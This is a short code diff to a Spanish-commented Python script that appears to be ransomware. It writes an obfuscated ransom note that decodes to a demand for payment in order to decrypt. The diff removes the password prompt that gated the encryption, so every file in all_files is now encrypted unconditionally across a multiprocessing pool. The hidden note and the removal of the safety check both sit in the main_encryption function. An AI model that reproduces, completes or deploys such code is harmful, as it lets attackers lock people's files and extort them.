@@ -60,14 +60,14 @@ def main_encryption():
         file.write(desencriptar('Ebnf vo fvttdsjqujpo qbsb eftfodsjqubs. Uibolt'))
 
     # Solicitar la contraseña al usuario
-    root = tk.Tk()
-    root.withdraw()
-    password = simpledialog.askstring("Contraseña", "Introduce la contraseña para encriptar los archivos:", show='*')
-    if password == "contraseña_correcta":
-        with multiprocessing.Pool() as pool:
-            pool.starmap(encrypt, [(file, key) for file in all_files])
-    else:
-        print("Contraseña incorrecta.")
+    # root = tk.Tk()
+    # root.withdraw()
+    # password = simpledialog.askstring("Contraseña", "Introduce la contraseña para encriptar los archivos:", show='*')
+    # if password == "contraseña_correcta":
+    with multiprocessing.Pool() as pool:
+        pool.starmap(encrypt, [(file, key) for file in all_files])
+    # else:
+    #     print("Contraseña incorrecta.")
 
 if __name__ == '__main__':
     p1 = multiprocessing.Process(target=main_encryption)
@@ -78,5 +78,3 @@ if __name__ == '__main__':
 
     p1.join()
     p2.join()
-
-
